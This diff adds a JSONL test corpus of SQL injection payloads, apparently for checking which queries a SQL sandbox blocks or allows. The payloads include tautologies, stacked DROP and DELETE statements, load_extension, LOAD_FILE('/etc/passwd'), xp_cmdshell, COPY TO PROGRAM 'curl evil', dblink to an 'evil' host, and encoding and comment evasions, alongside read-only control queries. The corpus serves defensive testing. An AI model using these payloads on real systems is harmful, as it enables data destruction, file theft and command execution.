@@ -1,0 +1,61 @@
+{"id": "taut-01", "family": "tautology", "intent": "destructive", "expect": "block", "payload": "' OR '1'='1", "source": "OWASP WSTG / CWE-89 经典等价式类别（按公开类别构造，非官方语料文件）"}
+{"id": "taut-02", "family": "tautology", "intent": "destructive", "expect": "block", "payload": "' OR 1=1--", "source": "OWASP WSTG / CWE-89"}
+{"id": "taut-03", "family": "tautology", "intent": "destructive", "expect": "block", "payload": "\" OR \"\"=\"", "source": "OWASP WSTG / CWE-89"}
+{"id": "taut-04", "family": "tautology", "intent": "destructive", "expect": "block", "payload": "admin'--", "source": "OWASP WSTG / CWE-89"}
+{"id": "taut-05", "family": "tautology", "intent": "destructive", "expect": "block", "payload": "' OR 'x'='x' --", "source": "OWASP WSTG / CWE-89"}
+{"id": "stack-01", "family": "stacked_write", "intent": "destructive", "expect": "block", "payload": "'; DROP TABLE orders;--", "source": "OWASP WSTG 堆叠查询类别"}
+{"id": "stack-02", "family": "stacked_write", "intent": "destructive", "expect": "block", "payload": "'; DROP TABLE order_items; --", "source": "OWASP WSTG 堆叠查询类别"}
+{"id": "stack-03", "family": "stacked_write", "intent": "destructive", "expect": "block", "payload": "1'; DELETE FROM orders WHERE 1=1;--", "source": "OWASP WSTG 堆叠查询类别"}
+{"id": "stack-04", "family": "stacked_write", "intent": "destructive", "expect": "block", "payload": "1'; UPDATE orders SET order_status='canceled';--", "source": "OWASP WSTG 堆叠查询类别"}
+{"id": "stack-05", "family": "stacked_write", "intent": "destructive", "expect": "block", "payload": "1'; INSERT INTO orders(order_id) VALUES('x');--", "source": "OWASP WSTG 堆叠查询类别"}
+{"id": "stack-06", "family": "stacked_write", "intent": "destructive", "expect": "block", "payload": "1'; REPLACE INTO orders(order_id) VALUES('x');--", "source": "OWASP WSTG 堆叠查询类别"}
+{"id": "ddl-01", "family": "ddl", "intent": "destructive", "expect": "block", "payload": "CREATE TABLE evil(x TEXT)", "source": "CWE-89 DDL 类别"}
+{"id": "ddl-02", "family": "ddl", "intent": "destructive", "expect": "block", "payload": "ALTER TABLE orders ADD COLUMN evil TEXT", "source": "CWE-89 DDL 类别"}
+{"id": "ddl-03", "family": "ddl", "intent": "destructive", "expect": "block", "payload": "TRUNCATE TABLE orders", "source": "CWE-89 DDL 类别"}
+{"id": "ddl-04", "family": "ddl", "intent": "destructive", "expect": "block", "payload": "DROP INDEX idx_orders_time", "source": "CWE-89 DDL 类别"}
+{"id": "sqlite-01", "family": "sqlite_specific", "intent": "destructive", "expect": "block", "payload": "ATTACH DATABASE 'evil.db' AS evil", "source": "SQLite 公开文档：ATTACH 可写任意文件"}
+{"id": "sqlite-02", "family": "sqlite_specific", "intent": "destructive", "expect": "block", "payload": "PRAGMA writable_schema=ON", "source": "SQLite 公开文档：PRAGMA 可改 schema"}
+{"id": "sqlite-03", "family": "sqlite_specific", "intent": "destructive", "expect": "block", "payload": "SELECT load_extension('/tmp/evil.so')", "source": "SQLite 公开文档：load_extension 执行任意代码"}
+{"id": "sqlite-04", "family": "sqlite_specific", "intent": "readonly", "expect": "allow", "payload": "SELECT name FROM sqlite_master WHERE type='table'", "source": "SQLite 元数据读取（只读，不应被误判为写入）"}
+{"id": "sqlite-05", "family": "sqlite_specific", "intent": "destructive", "expect": "block", "payload": "VACUUM", "source": "SQLite 公开文档：VACUUM 改写数据库文件"}
+{"id": "sqlite-06", "family": "sqlite_specific", "intent": "destructive", "expect": "block", "payload": "REINDEX", "source": "SQLite 公开文档：REINDEX 改写索引"}
+{"id": "sqlite-07", "family": "sqlite_specific", "intent": "destructive", "expect": "block", "payload": "PRAGMA database_list", "source": "SQLite PRAGMA（沙箱声明一律拦截 PRAGMA）"}
+{"id": "mysql-01", "family": "mysql_specific", "intent": "destructive", "expect": "block", "payload": "SELECT * FROM orders INTO OUTFILE '/tmp/x.txt'", "source": "MySQL 公开文档：INTO OUTFILE 写文件"}
+{"id": "mysql-02", "family": "mysql_specific", "intent": "destructive", "expect": "block", "payload": "SELECT LOAD_FILE('/etc/passwd')", "source": "MySQL 公开文档：LOAD_FILE 任意读文件"}
+{"id": "mysql-03", "family": "mysql_specific", "intent": "destructive", "expect": "block", "payload": "SELECT SLEEP(10)", "source": "时间盲注类别（资源耗尽）"}
+{"id": "mysql-04", "family": "mysql_specific", "intent": "destructive", "expect": "block", "payload": "SELECT BENCHMARK(10000000,MD5('x'))", "source": "时间盲注类别（资源耗尽）"}
+{"id": "mysql-05", "family": "mysql_specific", "intent": "destructive", "expect": "block", "payload": "1'; EXEC xp_cmdshell('whoami');--", "source": "MSSQL 命令执行类别"}
+{"id": "pg-01", "family": "postgres_specific", "intent": "destructive", "expect": "block", "payload": "COPY orders TO PROGRAM 'curl evil'", "source": "PostgreSQL 公开文档：COPY TO PROGRAM 执行命令"}
+{"id": "pg-02", "family": "postgres_specific", "intent": "destructive", "expect": "block", "payload": "SELECT pg_sleep(10)", "source": "时间盲注类别"}
+{"id": "pg-03", "family": "postgres_specific", "intent": "destructive", "expect": "block", "payload": "SELECT dblink('host=evil', 'SELECT 1')", "source": "PostgreSQL dblink 外联类别"}
+{"id": "union-01", "family": "union_probe", "intent": "readonly", "expect": "allow", "payload": "SELECT order_id FROM orders UNION SELECT order_id FROM order_items", "source": "UNION 只读查询（合规读操作，不应算注入）"}
+{"id": "union-02", "family": "union_probe", "intent": "readonly", "expect": "allow", "payload": "SELECT order_id FROM orders UNION ALL SELECT order_id FROM order_items", "source": "UNION ALL 只读查询"}
+{"id": "union-03", "family": "union_probe", "intent": "readonly", "expect": "allow", "payload": "SELECT order_id FROM orders ORDER BY 1 LIMIT 3", "source": "ORDER BY 列序探测（只读）"}
+{"id": "union-04", "family": "union_probe", "intent": "destructive", "expect": "block", "payload": "SELECT 1; DROP TABLE orders", "source": "多语句（只读+写入混合）"}
+{"id": "comment-01", "family": "comment_evasion", "intent": "destructive", "expect": "block", "payload": "SELECT 1 /**/ ; DROP TABLE orders", "source": "sqlmap tamper：注释绕过分词（公开类别）"}
+{"id": "comment-02", "family": "comment_evasion", "intent": "destructive", "expect": "block", "payload": "/*!50000DROP*/ TABLE orders", "source": "MySQL 版本注释执行类别"}
+{"id": "comment-03", "family": "comment_evasion", "intent": "readonly", "expect": "allow", "payload": "SELECT order_id /* 注释 */ FROM orders LIMIT 1", "source": "普通注释（只读，不应误杀）"}
+{"id": "comment-04", "family": "comment_evasion", "intent": "destructive", "expect": "block", "payload": "DR/**/OP TABLE orders", "source": "sqlmap tamper：关键字内插注释"}
+{"id": "encode-01", "family": "encoding", "intent": "destructive", "expect": "block", "payload": "1%27%3B%20DROP%20TABLE%20orders%3B--", "source": "URL 编码类别（公开）"}
+{"id": "encode-02", "family": "encoding", "intent": "destructive", "expect": "block", "payload": "0x44524f50205441424c45", "source": "十六进制字面量类别（公开）"}
+{"id": "encode-03", "family": "encoding", "intent": "destructive", "expect": "block", "payload": "CHAR(68)+CHAR(82)+CHAR(79)+CHAR(80)", "source": "字符函数拼装类别（公开）"}
+{"id": "encode-04", "family": "encoding", "intent": "destructive", "expect": "block", "payload": "%bf%27 OR 1=1--", "source": "GBK 宽字节注入类别（公开）"}
+{"id": "encode-05", "family": "encoding", "intent": "destructive", "expect": "block", "payload": "ＤＲＯＰ ＴＡＢＬＥ orders", "source": "全角字符类别（公开）"}
+{"id": "case-01", "family": "case_evasion", "intent": "destructive", "expect": "block", "payload": "DrOp TaBlE orders", "source": "sqlmap tamper：随机大小写（公开类别）"}
+{"id": "case-02", "family": "case_evasion", "intent": "destructive", "expect": "block", "payload": "dElEtE fRoM orders", "source": "sqlmap tamper：随机大小写"}
+{"id": "ws-01", "family": "whitespace", "intent": "destructive", "expect": "block", "payload": "DROP\tTABLE\torders", "source": "空白替换类别（公开）"}
+{"id": "ws-02", "family": "whitespace", "intent": "destructive", "expect": "block", "payload": "DROP\nTABLE\norders", "source": "换行替代空格类别"}
+{"id": "ws-03", "family": "whitespace", "intent": "destructive", "expect": "block", "payload": "DROP%0aTABLE%0aorders", "source": "URL 换行类别"}
+{"id": "poly-01", "family": "dangerous_func", "intent": "destructive", "expect": "block", "payload": "SELECT 1 WHERE 1=1 AND (SELECT COUNT(*) FROM pragma_table_info('orders'))>0", "source": "SQLite 表值 PRAGMA 函数（pragma_*）：词边界匹配不到，绕过\"PRAGMA 一律拦截\"；实测可枚举 schema（只读泄露）"}
+{"id": "poly-04", "family": "dangerous_func", "intent": "destructive", "expect": "block", "payload": "SELECT name FROM pragma_database_list", "source": "SQLite 表值 PRAGMA 函数变体（同上）"}
+{"id": "poly-05", "family": "dangerous_func", "intent": "destructive", "expect": "block", "payload": "SELECT COUNT(*) FROM pragma_table_list", "source": "SQLite 表值 PRAGMA 函数变体（同上）"}
+{"id": "poly-02", "family": "dangerous_func", "intent": "destructive", "expect": "block", "payload": "GRANT ALL ON orders TO evil", "source": "权限变更类别"}
+{"id": "poly-03", "family": "dangerous_func", "intent": "destructive", "expect": "block", "payload": "CREATE TRIGGER t AFTER INSERT ON orders BEGIN DELETE FROM orders; END", "source": "触发器植入类别"}
+{"id": "ro-01", "family": "readonly_baseline", "intent": "readonly", "expect": "allow", "payload": "SELECT COUNT(*) FROM order_items", "source": "普通只读查询（对照组）"}
+{"id": "ro-02", "family": "readonly_baseline", "intent": "readonly", "expect": "allow", "payload": "SELECT c.customer_state, SUM(oi.price) AS gmv FROM orders o JOIN order_items oi ON o.order_id=oi.order_id JOIN customers c ON o.customer_id=c.customer_id WHERE o.order_status!='canceled' GROUP BY c.customer_state ORDER BY gmv DESC LIMIT 5", "source": "业务主路径同构查询（对照组）"}
+{"id": "ro-03", "family": "readonly_baseline", "intent": "readonly", "expect": "allow", "payload": "WITH x AS (SELECT order_id FROM orders WHERE order_status='delivered') SELECT COUNT(*) FROM x", "source": "CTE 只读（对照组）"}
+{"id": "ro-04", "family": "readonly_baseline", "intent": "readonly", "expect": "allow", "payload": "SELECT SUM(oi.price) AS gmv FROM orders o JOIN order_items oi ON o.order_id=oi.order_id WHERE o.order_status != 'canceled' AND o.customer_id IN (SELECT customer_id FROM customers WHERE customer_state='SP')", "source": "子查询只读（对照组）"}
+{"id": "ro-05", "family": "readonly_baseline", "intent": "readonly", "expect": "allow", "payload": "SELECT 'DROP TABLE x' AS note", "source": "**字符串字面量里含高危词**的合法只读查询：用于测误杀"}
+{"id": "ro-06", "family": "readonly_baseline", "intent": "readonly", "expect": "allow", "payload": "SELECT order_id FROM orders WHERE order_status = 'delivered' LIMIT 10", "source": "带字面量条件的只读查询"}
+{"id": "ro-07", "family": "readonly_baseline", "intent": "readonly", "expect": "allow", "payload": "SELECT AVG(review_score) FROM reviews", "source": "聚合只读查询"}
+{"id": "ro-08", "family": "readonly_baseline", "intent": "readonly", "expect": "allow", "payload": "SELECT DATE(order_purchase_timestamp) d, COUNT(*) n FROM orders GROUP BY d ORDER BY d DESC LIMIT 7", "source": "时间分组只读查询"}
